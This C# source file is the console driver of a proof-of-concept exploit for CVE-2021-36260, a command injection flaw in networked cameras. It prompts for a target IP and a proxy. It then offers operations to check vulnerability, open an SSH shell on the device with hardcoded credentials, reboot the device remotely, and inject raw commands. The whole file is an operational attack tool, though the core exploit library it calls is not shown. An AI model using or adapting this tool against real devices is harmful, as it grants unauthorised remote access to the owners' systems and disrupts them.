using System.Net;
using Attacker36260Lib;

namespace Attacker36260
{
    internal class Program
    {
        public delegate void OpsCmd(PoC36260Attacker attacker);
        static void Main(string[] args)
        {
            Console.WriteLine("PoC CVE-2021-36260");
            Console.Write("Target Address:");
            string? tgtIPstr = Console.ReadLine();
            IPAddress? tgtIP;
            if(tgtIPstr == null||!IPAddress.TryParse(tgtIPstr,out tgtIP))
            {
                WrongInput();
                return;
            }
            
            Console.Write("Use Proxy?");
            string? useProxyStr= Console.ReadLine();
            int useProxy;
            if (useProxyStr == null)
            {
                WrongInput();
            }
            HttpClientHandler handler=new HttpClientHandler();
            if(!int.TryParse(useProxyStr,out useProxy))
            {
                WrongInput();
            }
            else
            {
                if (useProxy > 0)
                {
                    Console.Write("Proxy(uri type):");
                    string? uri=Console.ReadLine();
                    if(uri == null)
                    {
                        WrongInput();
                    }
                    handler.Proxy = new WebProxy(uri);
                }
            }
            PoC36260Attacker attacker = new PoC36260Attacker(new HttpClient(handler), tgtIP);
            Dictionary<string, OpsCmd> ops=new Dictionary<string, OpsCmd>();
            ops.Add("test", new OpsCmd(TestVul));
            ops.Add("shell", new OpsCmd(OpenShell));
            ops.Add("reboot", new OpsCmd(RebootMachine));
            ops.Add("forceshell",new OpsCmd(ForceOpenShell));
            ops.Add("rawcmd", new OpsCmd(RawCmd));
            while(true)
            {
                string? cmd;
                Console.Write("Operation:");
                cmd = Console.ReadLine();
                if(cmd == null)
                {
                    WrongInputNoExit();
                    continue;
                }
                if (cmd == "exit")
                {
                    return;
                }
                if(ops.ContainsKey(cmd))
                {
                    ops[cmd](attacker);
                }
                else
                {
                    WrongInputNoExit();
                }
                Console.WriteLine();
            }
        }
        public static void WrongInput()
        {
            Console.WriteLine("Wrong input!");
            Environment.Exit(0);
        }
        public static void WrongInputNoExit()
        {
            Console.WriteLine("Wrong input!");
        }
        public static void RawCmd(PoC36260Attacker attacker)
        {
            while (true)
            {
                string? cmd;
                Console.Write("Cmd:");
                cmd = Console.ReadLine();
                if (cmd == null)
                {
                    WrongInputNoExit();
                    continue;
                }
                if (cmd == "exit")
                {
                    return;
                }
                try
                {
                    QueryResult result=attacker.SendWeakPointQuery(cmd);
                    Console.WriteLine("Has already excuted cmd,but result unknown.");
                }catch(ArgumentException ex)
                {
                    Console.WriteLine("Cmd is longer than 22 ASCII chars.");
                    continue;
                }
               
            }
        }
        public static void TestVul(PoC36260Attacker attacker)
        {
            if (attacker.TestExist() != VulnerableCode.Vulnerable)
            {
                Console.WriteLine("Not vulnerable");
                return;
            }
            else
            {
                Console.WriteLine("Vulnerable");
                return;
            }
        }
        public static void OpenShell(PoC36260Attacker attacker)
        {
            if (attacker.TestExist()!=VulnerableCode.Vulnerable)
            {
                Console.WriteLine("Not vulnerable");
                return;
            }
            Console.Write("SSH port to open:");
            string? portStr = Console.ReadLine();
            int port;
            if (portStr == null)
            {
                WrongInputNoExit();
                return;
            }
            HttpClientHandler handler = new HttpClientHandler();
            if (!int.TryParse(portStr, out port))
            {
                WrongInputNoExit();
                return;
            }
            bool result=attacker.PullUpSSHShell("usrx", "114514alice", port);
            if (result)
            {
                Console.WriteLine("Successfully Open SSH On Port:{0}",port);
            }
            else
            {
                Console.WriteLine("Open SSH Failed");
            }
            return;
        }
        public static void ForceOpenShell(PoC36260Attacker attacker)
        {
            if (attacker.TestExist() != VulnerableCode.Vulnerable)
            {
                Console.WriteLine("Not vulnerable");
                return;
            }
            Console.Write("SSH port to open:");
            string? portStr = Console.ReadLine();
            int port;
            if (portStr == null)
            {
                WrongInputNoExit();
                return;
            }
            HttpClientHandler handler = new HttpClientHandler();
            if (!int.TryParse(portStr, out port))
            {
                WrongInputNoExit();
                return;
            }
            bool result = attacker.ForcePullUpSSHShell("usrx", "114514alice", port);
            if (result)
            {
                Console.WriteLine("Successfully Open SSH On Port:{0}", port);
            }
            else
            {
                Console.WriteLine("Open SSH Failed");
            }
            return;
        }
        public static void RebootMachine(PoC36260Attacker attacker)
        {
            if (attacker.TestExist() != VulnerableCode.Vulnerable)
            {
                Console.WriteLine("Not vulnerable");
                return;
            }
            bool result = attacker.RebootRemoteMachine();
            if (result)
            {
                Console.WriteLine("Successfully Reboot");
            }
            else
            {
                Console.WriteLine("Reboot Failed");
            }
        }
    }
}
